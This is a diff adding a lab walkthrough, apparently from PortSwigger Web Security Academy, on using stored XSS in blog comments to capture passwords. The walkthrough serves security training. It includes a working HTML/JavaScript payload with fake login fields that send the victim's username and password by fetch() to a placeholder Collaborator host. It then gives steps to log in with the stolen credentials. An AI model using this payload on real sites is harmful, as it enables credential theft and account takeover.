@@ -452,3 +452,31 @@ Reload the main blog page, using Burp Proxy or Burp Repeater to replace your own
 ![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/9b1a482a-d1b2-4e2c-88db-633b379b7ae8)
 
 ![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/58b59b07-53ee-4242-aef6-6ec90567c62f)
+
+**Lab: Exploiting cross-site scripting to capture passwords**
+
+This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.
+
+Using Burp Suite Professional, go to the Collaborator tab.
+Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
+Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:
+
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
+This script will make anyone who views the comment issue a POST request containing their username and password to your subdomain of the public Collaborator server.
+
+Go back to the Collaborator tab, and click "Poll now". You should see an HTTP interaction. If you don't see any interactions listed, wait a few seconds and try again.
+Take a note of the value of the victim's username and password in the POST body.
+Use the credentials to log in as the victim user.
+
+![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/2f20d576-e21d-4278-adaf-7acb9ec115ca)
+
+![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/8a64dc78-bb1f-4f79-b13d-602f678aca3f)
+
+![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/d6b30ad8-c9bc-49c5-ad59-7ce407023acb)
+
+![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/1d988065-e6f9-4342-b68a-ee557f6d06cb)
